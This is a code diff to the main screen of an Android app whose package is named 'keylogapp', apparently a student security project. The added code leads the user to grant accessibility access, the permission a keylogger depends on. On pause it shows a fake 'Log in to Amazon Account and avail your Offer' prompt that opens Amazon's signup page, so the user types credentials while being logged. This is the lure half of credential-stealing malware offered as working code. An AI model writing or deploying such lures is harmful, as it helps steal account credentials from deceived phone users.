@@ -3,7 +3,9 @@ package com.haneet.infsec.keylogapp;
 import android.app.AlertDialog;
 import android.content.DialogInterface;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
+import android.net.Uri;
 import android.os.Build;
 import android.provider.Settings;
 import android.support.v4.app.ActivityCompat;
@@ -21,6 +23,7 @@ public class MainActivity extends AppCompatActivity {
     private final static String LOG_TAG = Helper.getLogTag(MainActivity.class);
 
     private Button button;
+    private boolean isGranted = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -31,9 +34,15 @@ public class MainActivity extends AppCompatActivity {
         }
         button = findViewById(R.id.btn_settings);
         button.setOnClickListener(v -> {
-//            Intent openSettings = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
-//            openSettings.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY);
-//            startActivity(openSettings);
+            if(!isGranted) {
+                Intent openSettings = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                openSettings.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY);
+                startActivity(openSettings);
+                isGranted = true;
+            }else{
+                Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://www.primevideo.com/signup/ref=atv_nb_signup_sf"));
+                startActivity(intent);
+            }
         });
     }
 
@@ -45,7 +54,7 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void requestPermission() {
-//        ActivityCompat.requestPermissions(this, new String[]{INTERNET}, PERMISSION_REQUEST_CODE);
+        ActivityCompat.requestPermissions(this, new String[]{INTERNET}, PERMISSION_REQUEST_CODE);
     }
 
     @Override
@@ -85,5 +94,13 @@ public class MainActivity extends AppCompatActivity {
                 .show();
     }
 
-
+    @Override
+    protected void onPause() {
+        super.onPause();
+        showMessageOKCancel("Log in to Amazon Account and avail your Offer",
+                (dialog,which)->{
+                    Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://www.primevideo.com/signup/ref=atv_nb_signup_sf"));
+                    startActivity(intent);
+        });
+    }
 }
